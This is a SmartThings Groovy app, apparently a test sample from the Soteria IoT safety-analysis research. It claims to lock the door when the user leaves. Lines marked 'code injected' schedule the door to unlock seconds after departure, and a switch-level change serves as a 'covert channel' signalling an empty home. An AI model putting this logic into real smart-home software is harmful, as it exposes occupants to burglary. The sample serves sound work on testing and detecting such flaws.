/**
 *  Lock the door and turn on the switch (change intensity) when user is not present at home.
 *  Author: Z. Berkay Celik
 *  The app unlocks the door and turns on the switches after some time. 
 *  Email: zbc102@cse.psu.edu
 */

definition(
    name: "Soteria",
    namespace: "Soteria",
    author: "Soteria",
    description: "Potential safety problem by invoking a wrong method",
    category: "Convenience",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet@2x.png")

preferences {
       section("When you leave home....") {
       input "person", "capability.presenceSensor", multiple:false
       input "myswitch", "capability.switchLevel", title:"switchlevel?"
       input "thelock", "capability.lock", title:"door lock"
    }
}

def installed() {
       log.debug "Installed with settings: ${settings}"
       initialize()
}

def updated() {
       log.debug "Updated with settings: ${settings}"
       unsubscribe()
       initialize()
}

def initialize() {
    subscribe(person, "presence", presence)
}

def presence(evt) {
    log.debug "evt.name: $evt.value"
    if (evt.value != "not present") {  
        log.debug "home"
        myswitch.setLevel(80)
        state.home = true
        state.attack = false
    }

    else {
        log.debug "not home"
        state.home = false
        state.attack = true
        myswitch.setLevel(0) // user is gone change the switch intensity
        thelock.lock()
        runIn(0.1 * 60, triggerSwitch, [overwrite: false]) // code injected.
        runIn(0.1 * 60, unlockDoor, [overwrite: false]) // code injected.
    }
}

def triggerSwitch() {
    log.debug "no one in home!!!"
    changeSwitchIntensity() // covert channel
}

def unlockDoor() {
    log.debug "no one in home!!!"
    thelock.unlock()
}

def changeSwitchIntensity() {
    def value = myswitch.currentState("level").value.toInteger()
    log.debug "value:$value"   
    if(state.attack) {
        if(value == 0) {
            myswitch.setLevel(20)
        }
    }
}